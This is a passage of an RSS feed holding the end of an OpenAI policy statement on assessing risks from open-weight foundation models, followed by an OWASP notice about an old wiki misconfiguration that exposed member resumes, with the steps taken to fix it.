These interests may sometimes be in tension, and need to be thoughtfully managed in a case-specific way to achieve the best outcomes for society.</p><p>In the case of highly-capable foundation models which require significant resources to create (on the order of hundreds of millions of dollars or more), we believe that AI developers should assess their model’s potential to pose catastrophic risks, and, if the model’s risk level is found to be high, put appropriate mitigations in place before deploying or releasing it. This strikes an appropriate balance between risk-management and innovation: these models are <a href="https://arxiv.org/abs/2001.08361" rel="noopener noreferrer" target="_blank">anticipated to have the greatest capabilities</a>, while the cost of assessment is at most a small fraction of their development cost. Such assessments make sense regardless of whether the model’s weights are intended to be released widely or through an API.</p><p>On the other end of the spectrum, in the case of less resource-intensive foundation models, the balance of interests is different. On current evidence, such models appear much less likely to pose catastrophic risks, even with likely advances in finetuning and model-modification techniques. Meanwhile, assessments for catastrophic risk may cost a substantial fraction of the budget of small training runs, which could lead to a chilling effect on innovation and competition. We believe that such assessments for catastrophic risks should not be expected for these models, as there is huge value in protecting a diversity of developers’ ability to innovate on exciting new AI capabilities and allowing the marketplace of ideas and products to flourish, and the science indicates that these models’ risk is relatively low.</p><p>Assessment protocols like the Preparedness Framework are a useful tool to evaluate the <em>ex ante</em> risks from any type of model release, including open model weight releases. There are a few considerations that are specific for how to apply them to open weights releases.</p><p>One such consideration is that testing conditions would ideally reflect the range of ways that downstream actors can modify the model. One of the most useful properties of open models is that downstream actors can modify the models to expand their initial capabilities and tailor them to the developer’s specific applications. However, this also means that malicious parties could potentially enhance the model’s harmful capabilities. Rigorously assessing an open-weights release’s risks should thus include testing for a reasonable range of ways a malicious party could feasibly modify the model, including by finetuning. OpenAI already conducts some modification-testing as part of our Preparedness Framework (as we did in our <a href="https://openai.com/research/building-an-early-warning-system-for-llm-aided-biological-threat-creation" rel="noopener noreferrer" target="_blank">biorisk assessment</a>).</p><p>Another key consideration is that open model developers may be unable to rely on system-level safeguards to reduce the risk of their model’s misuse, as safeguards can often be removed by a malicious downstream user who possesses the model weights. Today, this difference in mitigation ability has limited consequences, since even our most capable current models are not rated as especially risky. But if a future model is scientifically determined to pose severe risks if released, then the path to reduce the risk of an open-weights release may rely on increasing the resilience of the external environment into which the model is released.&nbsp;</p><p>The need for societal resilience to AI misuse is broader than any one organization’s release decisions. Given continuing progress in and dissemination of AI algorithms, and increasingly widespread access to compute (including in countries of concern to the United States), today’s frontier AI capabilities — often accessible to only a few actors at time of creation — will eventually proliferate widely. The United States, and countries around the world, also have an opportunity to invest in and lead in mitigations that will limit the consequence of misuse, so the balance of outcomes is maximally positive.&nbsp;</p><p>For instance, strengthening resilience against AI-accelerated cyberattack risks might involve providing critical infrastructure providers early access to those same AI models, so they can be used to improve cyber-defense (as in the early projects we have funded as part of the <a href="https://openai.com/blog/openai-cybersecurity-grant-program" rel="noopener noreferrer" target="_blank">OpenAI Cybersecurity Grant Program</a>). Strengthening resilience against AI-accelerated biological threat creation risks may involve solutions totally unrelated to AI, such as improving nucleic acid synthesis screening mechanisms (as called for in Executive Order 14110), or improving public health systems’ ability to screen for and identify new pathogen outbreaks. If an AI model is rigorously shown to pose severe risks to public safety or national security, then the developer may also have an important role to play in building awareness of the new capabilities in advance of wide release (such as via notifying infrastructure providers or limiting API deployment), to create both time and motivation for urgently needed resilience efforts. This mirrors the norm of “responsible disclosure” from the cyber domain, where security researchers will temporarily embargo the release of vulnerabilities they find to give time for defenders to patch their systems, while not slowing down further security research.<br></p></div><!--]--><!--[--><div id="we-need-a-better-science-of-ai-risks" data-heading=""><p><h2>We need a better science of AI risks</h2></p></div><!--]--><!--[--><div><p>While we believe that assessing the risks of the most capable models is important, the science of AI risk evaluations is nascent. OpenAI and the broader AI community are still building the foundations of how to assess AI risks, and we are still constantly iterating on many of the operationalization details in the Preparedness Framework. Governments have an important role to play in helping the AI ecosystem mature its risk and capability evaluation practices, such as by convening experts from the offensive cybersecurity, critical infrastructure, and AI worlds to agree on a set of priority AI cyber threat models, and build out rigorous and empirical testbeds for assessing them. We strongly support the voluntary innovation-friendly and science-first approach being pursued by the USAISI.</p><p>Ever since OpenAI faced the choice of how to release GPT-2 in 2019 – opting to release only a small version of the model at first — new findings and events have continuously changed the landscape of considerations around open release of foundation model weights, sometimes every few months. We expect this trend to continue. Any government policy approach should be flexible and adaptable to future changes.<br></p></div><!--]--><!--]--></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OWASP Data Breach Notification (132 pts)]]></title>
            <link>https://owasp.org/blog/2024/03/29/OWASP-data-breach-notification</link>
            <guid>39898743</guid>
            <pubDate>Mon, 01 Apr 2024 20:21:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://owasp.org/blog/2024/03/29/OWASP-data-breach-notification">https://owasp.org/blog/2024/03/29/OWASP-data-breach-notification</a>, See on <a href="https://news.ycombinator.com/item?id=39898743">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="main" role="tabpanel" aria-labelledby="main-link" tabindex="0">
            <a><img src="https://owasp.org/assets/images/people/staff_andrew.jpg" alt="image"></a>
            
            <p>Friday, March 29, 2024 </p><p>In late February 2024, after receiving a few support requests, the OWASP Foundation became aware of a misconfiguration of OWASP’s old Wiki web server, leading to a data breach involving decade+-old member resumes.</p>

<!--more-->

<ul>
  <li><strong>Who is affected?</strong> If you were an OWASP member from 2006 to around 2014 and provided your resume as part of joining OWASP, we advise assuming your resume was part of this breach.</li>
  <li><strong>What data was exposed?</strong> The resumes contained names, email addresses, phone numbers, physical addresses, and other personally identifiable information.</li>
  <li><strong>Why was the data collected?</strong> OWASP collected resumes as part of the early membership process, whereby members were required in the 2006 to 2014 era to show a connection to the OWASP community. OWASP no longer collects resumes as part of the membership process.</li>
  <li><strong>What steps has OWASP taken to rectify the breach?</strong> We have disabled directory browsing, reviewed the web server and Media Wiki configuration for other security issues, removed the resumes from the wiki site altogether, and purged the CloudFlare cache to prevent further access. Lastly, we have requested that the information be removed from the Web Archive.</li>
  <li><strong>Who will OWASP notify?</strong> We are bringing this issue to the broader public’s attention with abundant caution. As many of the individuals affected by this breach are no longer with OWASP and the age of the data is between ten and 18 years old, a great deal of the personal details included in this breach are significantly out of date, making contact difficult. Regardless, we will contact the email addresses discovered during our investigations.</li>
  <li><strong>How does OWASP protect current membership data?</strong> We apply modern cloud-based security best practices such as two-factor authentication, minimal access, and resiliency to protect our membership data. We also purposefully collect only minimal information for OWASP membership to minimize any potential data loss in the future.</li>
  <li><strong>I think I am affected. What do I need to do?</strong> OWASP has already removed your information from the Internet, so no immediate action on your part is required. Nothing needs to be done if the information at risk is outdated. However, if the information is current, such as containing your mobile phone number, please take the usual precautions when answering unsolicited emails, mail, or phone calls.</li>
</ul>

<p>We recognize the significance of this breach, especially considering the OWASP Foundation’s emphasis on cybersecurity. We apologize to those affected by the breach and are committed to ensuring that this does not happen again. We are reviewing our data retention policies and will be implementing additional security measures to prevent future breaches.</p>

          </section></div>]]></description>
        </item>
    </channel>
</rss>